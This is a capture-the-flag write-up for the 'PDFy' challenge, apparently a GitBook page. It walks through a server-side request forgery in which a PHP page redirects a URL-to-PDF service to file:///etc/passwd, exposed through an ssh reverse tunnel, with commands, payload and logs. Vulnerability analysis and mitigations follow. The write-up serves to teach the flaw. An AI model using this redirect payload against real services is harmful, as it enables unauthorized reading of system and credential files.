---
icon: file-pdf
cover: ../../.gitbook/assets/Screenshot 2026-03-04 221423.png
coverY: -17.41824521851188
---

# PDFy

***

#### Challenge Description

Welcome to PDFy, the exciting challenge where you turn your favorite web pages into portable PDF documents! It's your chance to capture, share, and preserve the best of the internet with precision and creativity. Join us and transform the way we save and cherish web content! NOTE: Leak `/etc/passwd` to get the flag!

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/PDFy]
└─$ curl -I http://94.237.53.113:80
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Apache/2.4.41
```

The application is straightforward. Navigating to the target reveals a clean, single-purpose web application:

**PDFy** - "Generate PDFs based on your favourite sites!"

It's literally that simple. A single input field accepting a URL, a submit button, and a preview of what the server will convert to PDF. The application architecture is clear from the interface itself:

1. User provides a URL
2. Server fetches that URL
3. Server converts the content to PDF
4. PDF is rendered back to the user

This is a textbook **Server-Side Request Forgery (SSRF)** scenario. The server is making requests on our behalf, and we can control the destination. The challenge description even hints at it: "Leak `/etc/passwd` to get the flag!"

***

### Enumeration

Let's think about this step-by-step. The application needs to:

* Handle external URLs
* Fetch remote content
* Convert that content to PDF

When a server fetches external URLs, it typically follows HTTP redirects. This is our attack surface. If we can control a URL that the server fetches, we can redirect it to local file:// URIs.

The challenge:

* We need to make our machine accessible to the target server
* We can't directly use `file:///etc/passwd` because the server won't know to fetch from it initially
* Solution: We create a legitimate-looking webpage that redirects to `/etc/passwd`

For this, we'll use **serveo.net** - a service that creates reverse SSH tunnels, allowing us to expose local services to the internet without port forwarding.

```
┌──(sn0x㉿sn0x)-[~/HTB/PDFy]
└─$ ssh -R 80:localhost:3000 serveo.net

[...]
Forwarding HTTP traffic from https://3fb325e0860441a0285a51391551bb3b.serveo.net
to local server on localhost:3000
```

The tunnel is now active. Any HTTP request to `https://3fb325e0860441a0285a51391551bb3b.serveo.net` will be forwarded to our local port 3000.

Why this matters: The target server can now reach our machine via this public URL, which it will treat as any other external website.

***

### Exploitation

#### Step 1: Create the Exploit Payload

Now we craft our malicious PHP page. The key is HTTP redirect semantics - when the PDF conversion tool fetches our URL, we immediately redirect it to `file:///etc/passwd`.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/PDFy]
└─$ cat > index.php << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>System Command Output</title>
</head>
<body>
    <h1>System Command Output:</h1>
    <?php
    // Redirect to the /etc/passwd file
    header("Location: file:///etc/passwd");
    exit();
    ?>
</body>
</html>
EOF
```

What's happening here: The PHP script issues an HTTP 302 redirect header pointing to `file:///etc/passwd`. When the PDF conversion library (likely a headless browser or similar) fetches our URL and encounters this redirect, it will attempt to follow it. Since many PDF tools run with elevated privileges or in permissive sandbox configurations, they can access local files via the `file://` protocol.

#### Step 2: Host the Payload Locally

```bash
┌──(sn0x㉿sn0x)-[~/HTB/PDFy]
└─$ php -S 127.0.0.1:3000

[Mon Jul 22 16:02:39 2024] PHP 8.3.9 Development Server (http://127.0.0.1:3000) started
[Mon Jul 22 16:02:39 2024] Listening on http://127.0.0.1:3000
[Mon Jul 22 16:02:39 2024] Press Ctrl-C to quit
```

The built-in PHP development server is running on port 3000, waiting for requests.

#### Step 3: Establish the Reverse Tunnel

In a separate terminal, we maintain our serveo tunnel:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/PDFy]
└─$ ssh -R 80:localhost:3000 serveo.net

Forwarding HTTP traffic from https://3fb325e0860441a0285a51391551bb3b.serveo.net
HTTP request from 94.237.53.113 to https://3fb325e0860441a0285a51391551bb3b.serveo.net/
```

Notice the log: the target server at `94.237.53.113` has already made a request to our serveo URL. This is good - it means the tunnel is working and the application is likely checking the URL or pre-caching it.

#### Step 4: Trigger the Exploit

```bash
┌──(sn0x㉿sn0x)-[~/HTB/PDFy]
└─$ # Navigate to the target and input our serveo URL
```

We input the serveo URL into the PDFy application's input field:

```
https://3fb325e0860441a0285a51391551bb3b.serveo.net/
```

Then click **Submit**.

#### Step 5: Monitor and Observe

Back on our PHP server terminal:

```bash
[Mon Jul 22 16:03:10 2024] 127.0.0.1:45254 Accepted
[Mon Jul 22 16:03:10 2024] 127.0.0.1:45254 [302]: GET / index.php
[Mon Jul 22 16:03:10 2024] 127.0.0.1:45254 Closing
```

The server received our request and executed the PHP redirect (302 status). The PDF conversion tool then followed the redirect to `file:///etc/passwd`.

#### Step 6: Retrieve the Flag

The PDF viewer in the browser now displays the contents of `/etc/passwd`. Among the user accounts listed, the flag will be revealed in the page content or as metadata in the rendered PDF.

***

### Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                     ATTACKER MACHINE                             │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 1. Create redirect payload (index.php)                  │   │
│  │    Redirect Location: file:///etc/passwd                │   │
│  └──────────────────────────────────────────────────────────┘   │
│                            ↓                                      │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 2. Host on localhost:3000 (php -S)                      │   │
│  └──────────────────────────────────────────────────────────┘   │
│                            ↓                                      │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 3. Create reverse SSH tunnel (serveo.net)               │   │
│  │    localhost:3000 → public.serveo.net                   │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                            ↓ (via public internet)
┌─────────────────────────────────────────────────────────────────┐
│                      TARGET SERVER (94.237.53.113)               │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ PDFy Web Application                                     │   │
│  │ - URL input field                                        │   │
│  │ - PDF conversion engine (headless browser/tool)         │   │
│  └──────────────────────────────────────────────────────────┘   │
│                            ↓                                      │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 4. User submits: https://public.serveo.net/             │   │
│  │    Server initiates HTTP GET request                    │   │
│  └──────────────────────────────────────────────────────────┘   │
│                            ↓                                      │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 5. Receives HTTP 302 redirect to file:///etc/passwd     │   │
│  │    PDF tool follows redirect (misconfiguration)         │   │
│  └──────────────────────────────────────────────────────────┘   │
│                            ↓                                      │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 6. Accesses /etc/passwd via file:// protocol            │   │
│  │    Includes file contents in PDF                        │   │
│  └──────────────────────────────────────────────────────────┘   │
│                            ↓                                      │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ 7. Rendered PDF sent to user browser                    │   │
│  │    Contains leaked /etc/passwd                          │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                            ↓
                     FLAG RETRIEVED
```

***

### Vulnerability Analysis

#### Root Cause: SSRF + Insufficient Redirect Validation

The vulnerability chain involves two distinct issues:

1. **Server-Side Request Forgery (SSRF)**
   * The application fetches arbitrary URLs without proper validation
   * No whitelist/blacklist of allowed domains
   * No restriction on protocols (http/https only)
2. **Insecure Redirect Handling**
   * The PDF conversion tool blindly follows HTTP redirects
   * No validation that redirect targets are still external
   * `file://` protocol is not blocked or restricted

#### Vulnerable Code Pattern

While we don't have source access, the likely vulnerable pattern looks like:

```python
# Pseudocode of likely vulnerability
def convert_url_to_pdf(user_url):
    response = requests.get(user_url, allow_redirects=True)
    # allow_redirects=True is the problem - follows all redirects
    pdf = convert_html_to_pdf(response.text)
    return pdf
```

The `allow_redirects=True` parameter (or equivalent) follows all redirects without validation, enabling the SSRF attack.

#### Why This Works

* **Protocol Confusion**: The server makes HTTP requests. The PDF tool may support multiple protocols (http, https, file, ftp, etc.)
* **Privilege Escalation**: The PDF conversion service might run with higher privileges than the web application
* **Trust Boundary Violation**: The PDF tool trusts redirects from "external" sources without re-validating the destination

***

### Techniques

| Technique                              | Description                                                        | Relevance                  |
| -------------------------------------- | ------------------------------------------------------------------ | -------------------------- |
| **SSRF** (Server-Side Request Forgery) | Forcing a server to make requests to attacker-controlled locations | Core attack vector         |
| **HTTP Redirect Following**            | Automatic redirect handling in HTTP clients                        | Exploitation mechanism     |
| **Reverse SSH Tunneling**              | Using SSH to expose local services publicly                        | Infrastructure bypass      |
| **File Protocol (file://)**            | URI scheme for accessing local filesystem                          | Payload delivery           |
| **PHP Redirect Headers**               | `header("Location: ...")` to craft redirects                       | Payload implementation     |
| **Headless Browser Exploitation**      | Attacking PDF/screenshot tools that follow redirects               | Target weakness            |
| **Protocol Confusion**                 | Mixing HTTP and file:// protocols                                  | Vulnerability intersection |

***

### Mitigation

For developers encountering similar scenarios:

1.  **Implement URL Validation**

    ```php
    $allowed_hosts = ['trusted-domain.com', 'example.com'];
    $url_host = parse_url($user_url, PHP_URL_HOST);
    if (!in_array($url_host, $allowed_hosts)) {
        die("URL not whitelisted");
    }
    ```
2. **Disable Automatic Redirect Following**
   * Use `allow_redirects=false` in HTTP clients
   * Manually validate redirect targets before following
3. **Protocol Whitelist**
   * Only allow `http://` and `https://` protocols
   * Explicitly block `file://`, `ftp://`, `gopher://`, etc.
4. **Content-Type Validation**
   * Verify that redirected responses are HTML/PDF before processing
   * Reject redirects to system file paths
5. **Sandboxing**
   * Run PDF conversion tools in isolated environments
   * Restrict access to `/etc/passwd` and sensitive files via AppArmor/SELinux

***

### Summary

**PDFy** demonstrates a critical SSRF vulnerability combined with insecure redirect handling. By leveraging a public-facing reverse tunnel and a simple HTTP redirect, we were able to force the server to leak `/etc/passwd`. This challenge underscores why input validation and careful handling of external requests are fundamental security principles.

The attack required:

* Understanding the application architecture
* Recognizing the SSRF opportunity
* Creating a publicly accessible redirect endpoint
* Exploiting the PDF tool's blind redirect following

Result: **Flag obtained via `/etc/passwd` disclosure.**

***
